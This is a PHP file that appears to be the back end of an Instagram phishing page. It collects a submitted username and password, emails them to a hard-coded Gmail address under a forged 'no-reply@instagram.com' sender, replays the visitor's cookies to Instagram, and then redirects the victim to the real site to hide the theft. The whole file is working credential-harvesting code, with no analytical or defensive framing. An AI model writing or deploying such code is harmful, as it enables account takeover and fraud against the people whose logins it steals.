<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $to = "precioustk2000@gmail.com";
    $subject = "🔥 Instagram Login Attempt";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: no-reply@instagram.com\r\n";
    $headers .= "Reply-To: no-reply@instagram.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    mail($to, $subject, $message, $headers);

    $ch = curl_init("https://www.instagram.com/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    if (!empty($_COOKIE)) {
        $cookieHeader = "Cookie: ";
        foreach ($_COOKIE as $name => $value) {
            $cookieHeader .= "$name=$value; ";
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: $cookieHeader"));
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    header("Location: https://www.instagram.com/");
    exit();
} else {
    header("Location: index.html");
}
?>